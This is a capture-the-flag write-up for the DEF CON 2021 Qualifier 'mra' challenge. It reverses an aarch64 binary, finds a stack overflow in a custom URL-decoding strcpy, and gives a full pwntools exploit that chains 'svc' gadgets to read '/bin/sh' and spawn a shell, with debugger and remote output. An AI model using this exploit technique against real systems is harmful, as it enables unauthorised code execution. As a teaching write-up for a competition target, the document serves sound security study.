# DEF CON CTF Qualifier 2021

## mra

> 114  
>  
> Is it odd?  
>  
> `nc mra.challenges.ooo 8000`  
>  
> [`mra`](`mra`) [`live here`](https://archive.ooo/c/mra/406/)

Tags: _pwn_ _bof_ _rop_ _arm_ _arm64_ _aarch64_

## Summary

Aarch64/Linux-based, statically-linked, stripped, _syscall read /bin/sh into
BSS, then syscall execve a shell_.

> Here's a similar problem from last week: [System
> dROP](https://github.com/datajerk/ctf-write-
> ups/tree/master/cyberapocalypsectf2021/system_drop) using ret2csu; the
> pattern is the same, call `read` to _read_ `/bin/sh\0` from `stdin` into the
> BSS, then chain to `execve` to get a shell.

Statically-linked Linux binaries are chock-full of gadgets including
`syscall`, and this challenge binary is no different, except that `syscall` is
`svc #0`, and the constants are different, and the registers have different
names, but that's about it.

This binary is also stripped, so reversing took a bit longer (ok, a lot longer
:-).

## Tooling

I used [Option 3: Aarch64 on x86_64 with QEMU-
user](https://github.com/datajerk/ctf-write-
ups/tree/master/wpictf2021/strong_arm#option-3-aarch64-on-x86_64-with-qemu-
user).

> Option 1 from the same link did not work, _Bus error_; I didn't have time to
> troubleshoot it.  Probably OOO making the stack go _up_--sadists.

## Analysis

### Checksec

```  
   Arch:     aarch64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

No PIE or stack canary, easy BOF, easier ROP.

### Give it a go

> This section intentionally left blank because that is all the output you
> get; send some garbage, nothing.

### Decompile in Ghidra

> All of the functions I hand labeled as part of the reversing process.

```c  
undefined8 main(undefined4 param_1,undefined8 param_2)  
{  
 uint uVar1;  
 uint uVar2;  
 int iVar3;  
 undefined *puVar4;  
 undefined *puVar5;  
 ulong uVar6;  
 long lVar7;  
 undefined8 uStack0000000000000010;  
 undefined4 uStack000000000000001c;  
 undefined8 in_stack_00000020;  
 char cVar8;  
 char *pcVar9;  
 char *pcVar10;  
 char *pcVar11;

 uStack0000000000000010 = param_2;  
 uStack000000000000001c = param_1;  
 setvbuf(PTR_DAT_0041cf60,0,2,0);  
 setvbuf(PTR_FUN_0041cf58,0,2,0);  
 pcVar10 = "GET /api/isodd/";  
 pcVar9 = "Buy isOddCoin, the hottest new cryptocurrency!";  
 cVar8 = '\0';  
 memset(&stack0x00000028,0,0x400);  
 pcVar11 = "public";  
 uVar2 = read(0,&stack0x00000028,0x3ff);  
 if ((8 < uVar2) && (iVar3 = strncmp(&stack0x00000028,pcVar10,0xf), iVar3 ==
0)) {  
```

`setvbuf`, `memset`, `read`, and `strncmp` are all guesses based on what they
do and look like and their position within the text.  E.g. the `0,2,0` is a
dead giveaway for `setvbuf` and is present in almost every _good_ binary pwn;
`memset` followed by a `read`, yeah, common pattern too.

The `if` block spans all of `main`; to pass that check your input must match
the first `0xf` (15) bytes of `pcVar10` (`GET /api/isodd/`).

```c  
   puVar4 = (undefined *)strchr(&stack0x00000028,10);  
   if (puVar4 != (undefined *)0x0) {  
     *puVar4 = 0;  
     if (puVar4[-1] == '\r') {  
       puVar4[-1] = '\0';  
     }  
   }  
   puVar4 = (undefined *)strstr(&stack0x00000028," HTTP/");  
   if (puVar4 != (undefined *)0x0) {  
     *puVar4 = 0;  
   }  
   puVar4 = (undefined *)strchr(&stack0x00000028,0x3f);  
   if (puVar4 != (undefined *)0x0) {  
     *puVar4 = 0;  
     puVar4 = puVar4 + 1;  
     iVar3 = strncmp(puVar4,"token=",6);  
     if (iVar3 == 0) {  
       pcVar11 = puVar4 + 6;  
     }  
   }  
   puVar4 = &stack0x00000037;  
   puVar5 = (undefined *)strchr(puVar4,0x2f);  
   if (puVar5 != (undefined *)0x0) {  
     *puVar5 = 0;  
   }  
   uVar6 = strlen(puVar4);  
```

Next up is a series of checks that also split up your input with NULLs (`\0`).

The first block searches for a `\n` or `\r\n` and replaces with a `\0`.

The second block searches for ` HTTP/` and replaces the ` ` with a `\0`.

The third block looks for `?` (`0x3f`), replaces with `\0` terminating the
string after `isodd/`; if `token=` follows that `?`, then assign `pcVar11` to
the string after `=`, that will be terminated by the `memset` at `main` start
or the ` HTTP/` match above.

Lastly, starting after `isodd/` (`&stack0x00000037 - &stack0x00000028 = 0xf`,
the length of `GET /api/isodd/`), replace the first `/` with a `\0` to fuck
with your ability to put `/bin/sh` there, then assign `pcVar4` the string
after `isodd/` ending before `?` (remember it is `\0` now).

So far our input is looking like: `GET /api/isodd/pcVar4?token=pcVar11 HTTP/`

`uVar6` is set to the length of `pcVar4`.  This will limit the length of our
input:

```c  
   iVar3 = strcmp(pcVar11,"enterprise");  
   if (iVar3 == 0) {  
     if (0xc < uVar6) {  
       response(0x191,"{\n\t\"error\": \"contact us for unlimited large number support\"\n}");  
       return 0;  
     }  
   }  
   else {  
     iVar3 = strcmp(pcVar11,"premium");  
     if (iVar3 == 0) {  
       if (9 < uVar6) {  
         response(0x191,"{\n\t\"error\": \"sign up for enterprise to get large number support\"\n}";  
         return 0;  
       }  
     }  
     else {  
       pcVar11 = "public";  
       if (6 < uVar6) {  
         response(0x191,"{\n\t\"error\": \"sign up for premium or enterprise to get large numbersupport\"\n}";  
         return 0;  
       }  
     }  
   }  
```

The next three checks the `token` (`pcVar11`) and restricts the length of
`pcVar4` based on the `token`, i.e. `enterprise`:`12`, `premium`:`9`, and
`public`/_default_:`6`.

If you clear all three checks, then `puVar4` will be string copied to another
stack variable.  And given all the checks `puVar4` cannot be more than 12
bytes in length, right?

String up to this point:

With input of `GET /api/isodd/stuff?token=public HTTP/` the string will be
mangled up as `GET /api/isodd/stuff\0token=public\0HTTP/`.

Moving on...

```c  
   iVar3 = strcpy(&stack0x00000428,puVar4);  
```

And finally `strcpy`, the vulnerable function:

```c  
int strcpy(long param_1,long param_2)  
{  
 uint uVar1;  
 long lStack20;  
 long lStack28;  
 byte bStack37;  
 int iStack38;  
 int iStack3c;  
  
 iStack3c = 0;  
 iStack38 = 0;  
 lStack20 = param_2;  
 lStack28 = param_1;  
 while (bStack37 = *(byte *)(lStack20 + iStack3c), bStack37 != 0) {  
   if (bStack37 == 0x25) {  
     uVar1 = htoi(*(undefined *)(lStack20 + (long)iStack3c + 1));  
     bStack37 = htoi(*(undefined *)(lStack20 + (long)iStack3c + 2));  
     bStack37 = (byte)((uVar1 & 0xff) << 4) | bStack37;  
     iStack3c = iStack3c + 3;  
   }  
   else {  
     iStack3c = iStack3c + 1;  
   }  
   *(byte *)(lStack28 + iStack38) = bStack37;  
   iStack38 = iStack38 + 1;  
 }  
 return iStack38;  
}  
```

> For readability I removed all `00000000000000`s from the variable names.

This just loops through and copies the bytes from `param_2` to `param_1`,
however if the byte is `0x25` (`%`), then take the next two bytes and convert
from hex to int, then store that in the `param_1` array and increment the
offset by 3 vs. 1 to get to the next byte.

There's no checking for `\0` in the `%` block.  By using a payload of
`%\0buffer-overflow`, we can pass the `puVar4` length check above and overflow
the buffer.

To crash the system and find the distance to `x29` and `x30`:

```bash  
echo -e "GET /api/isodd/%\x00$(cyclic 1000)" | qemu-aarch64 -g 9000 mra  
```

GDB:

```  
$x30 : 0x6261616562616164  →  0x6261616562616164  
$sp  : 0x0000004000780a40  →  0x6261616362616162  →  0x6261616362616162  
$pc  : 0x0061616562616164  →  0x0061616562616164  
$cpsr: [negative ZERO CARRY overflow interrupt fast]  
$fpsr: 0x0000000000000000  →  0x0000000000000000  
$fpcr: 0x0000000000000000  →  0x0000000000000000  
─────────────────────────────────────────────────────────────────────────────────
stack ────  
0x0000004000780a40│+0x0000: 0x6261616362616162  →  0x6261616362616162    ← $sp  
0x0000004000780a48│+0x0008: 0x6261616562616164  →  0x6261616562616164  
0x0000004000780a50│+0x0010: 0x6261616762616166  →  0x6261616762616166  
0x0000004000780a58│+0x0018: 0x6261616962616168  →  0x6261616962616168  
0x0000004000780a60│+0x0020: 0x000000400078646a  →  0x0000000000000000  →
0x0000000000000000  
0x0000004000780a68│+0x0028: 0x00000040007809d8  →  0x616161626161610a  →
0x616161626161610a  
0x0000004000780a70│+0x0030: 0x000000000000002f  →  0x000000000000002f  
0x0000004000780a78│+0x0038: 0x0000008c0000008a  →  0x0000008c0000008a  
────────────────────────────────────────────────────────────────────────
code:arm64:ARM ────  
[!] Cannot disassemble from $PC  
[!] Cannot access memory at address 0x61616562616164  
```

Compute distance using the value from `x30`:

```  
# echo 6261616562616164 | xxd -r -p | rev ; echo  
daabeaab  
# cyclic 1000 | sed 's/daabeaab.*//g' | wc -c  
112  
```

> Our ROP chain starts after 112 bytes.

### Okay. Let's go shopping.

```  
# man 2 syscall  
...  
...  
...  
      Arch/ABI    Instruction           System  Ret  Ret  Error    Notes  
                                        call #  val  val2  
      ───────────────────────────────────────────────────────────────────  
      alpha       callsys               v0      v0   a4   a3       1, 6  
      arc         trap0                 r8      r0   -    -  
      arm/OABI    swi NR                -       a1   -    -        2  
      arm/EABI    swi 0x0               r7      r0   r1   -  
      arm64       svc #0                x8      x0   x1   -  
...  
...  
...  
      x86-64      syscall               rax     rax  rdx  -        5  
```

As stated in the summary above, statically-linked Linux binaries are fully
stocked with ROP gadgets including `syscall`, or in this case `svc #0`.

To see what my options were I used `/usr/bin/aarch64-linux-gnu-objdump -d mra | grep -A10 -B10 svc`:

```  
 4007b4:       f85f83e8        ldur    x8, [sp, #-8]  
 4007b8:       f85f03e0        ldur    x0, [sp, #-16]  
 4007bc:       f85e83e1        ldur    x1, [sp, #-24]  
 4007c0:       f85e03e2        ldur    x2, [sp, #-32]  
 4007c4:       d4000001        svc     #0x0  
 4007c8:       d10083ff        sub     sp, sp, #0x20  
 4007cc:       d65f03c0        ret  
```

> This isn't the complete output, there are many more, but this first hit, is
> all we need.

This gadget will read _up_ stack the syscall number, and its first three
parameters, then execute the syscall, after that the stack pointer will be
moved _up_ to our next set of parameters, then `ret`, but `ret` to what?
Well, `syscall` again! (See [strong-arm](https://github.com/datajerk/ctf-
write-ups/tree/master/wpictf2021/strong_arm) for a detailed write up on
Aarch64 ROP).

### Attack

The plan is rather simple, use the `read` syscall to read `/bin/sh` into the
BSS, then chain to `execve` to get a shell.

## Exploit

```python  
#!/usr/bin/env python3

from pwn import *  
import urllib.parse

binary = context.binary = ELF('./mra')  
binary.symbols['syscall'] = 0x4007b4

if args.REMOTE:  
   p = remote('mra.challenges.ooo', 8000)  
else:  
   if args.GDB:  
       p = process(('qemu-'+context.arch+' -g 9000 -L /usr/'+context.arch+'-linux-gnu '+binary.path).split())  
   else:  
       p = process(('qemu-'+context.arch+' -L /usr/'+context.arch+'-linux-gnu '+binary.path).split())  
```

Standard pwntools header, plus creating a symbol for our syscall gadget.

```python  
shell = b'/bin/sh\0'

payload  = b''  
payload += b'GET /api/isodd/'  
payload += b'%\0'  
payload += 40 * b'A'

urlload  = b''  
urlload += p64(0)  
urlload += p64(0)  
urlload += p64(binary.bss())  
urlload += p64(constants.SYS_execve)  
urlload += p64(len(shell))  
urlload += p64(binary.bss())  
urlload += p64(constants.STDIN_FILENO)  
urlload += p64(constants.SYS_read)  
urlload += 8 * b'A'  
urlload += p64(binary.sym.syscall)

payload += urllib.parse.quote(urlload).encode()  
```

The initial part of the payload should be clear from the Analysis section
above.

> The payload should be URL quoted (`%nn%nn%nn`...) so that `strcpy` does not
> prematurely terminate.

Starting form the bottom, the `8 * b'A'` and `syscall` will land in `x29` and
`x30` curtesy of the end from `strcpy` with `sp` pointing to `8 * b'A'` on the
stack with our `read` payload just above it.  The `syscall` gadget (see
assembly above) will load the next four stack lines going _up_ into `x8`,
`x0`, `x1`, `x2`, and then execute the syscall to read from `stdin` (`0`) our
8-byte payload (`/bin/sh\0`) into the BSS (`binary.bss()`); after the syscall
`sp` will be pointing just below our next set of four parameters, when `ret`
is executed, `syscall` is executed again since `x30` was never updated (this
isn't x86_64), and the cycle continues, but this time with `execve` executing
`/bin/sh\0` stored in the BSS.

```python  
payload += (0x3ff - len(payload)) * b'A'

p.send(payload)  
p.send(shell)  
p.interactive()  
```

> The padding at the end of the payload is to fill up the first read so that
> our second `send` does not land in the wrong `read`.

Finally we just need to send the payload, that will wait for our input
(`/bin/sh\0`), then continue on with the `execve`.

Output:

```bash  
# ./exploit.py REMOTE=1  
[*] '/pwd/datajerk/dc2021q/mra/mra'  
   Arch:     aarch64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to mra.challenges.ooo on port 8000: Done  
[*] Switching to interactive mode  
$ cat flag  
OOO{the_0rder_0f_0verflow_is_0dd}  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/dc2021q/mra).